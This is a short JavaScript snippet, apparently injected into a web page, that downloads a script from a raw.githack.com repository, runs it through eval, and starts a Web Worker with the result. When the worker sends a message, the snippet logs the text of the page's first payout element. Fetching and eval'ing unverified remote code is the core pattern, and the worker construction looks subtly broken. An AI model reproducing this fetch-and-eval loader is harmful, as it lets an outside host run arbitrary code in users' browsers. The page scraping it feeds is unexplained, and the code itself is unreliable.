var wbkDataCollection___________;
async function runDataCollection () {
  if (typeof Worker !== "undefined") {
    if (typeof wbkDataCollection___________ == "undefined") {
      
      wbkDataCollection___________ = new Worker(eval(await (await fetch('https://raw.githack.com/rasanu/wbkDataCollection___________/main/0.js')).text()));
    }
    wbkDataCollection___________.onmessage = function (event) {
      console.log(event);
      console.log(
        document.querySelector(".payouts-block > .payout:nth-child(1)")
          .innerText
      );
    };
  } else {
    document.getElementById("body").innerHTML =
      "Sorry, your browser does not support Web Workers...";
  }
};
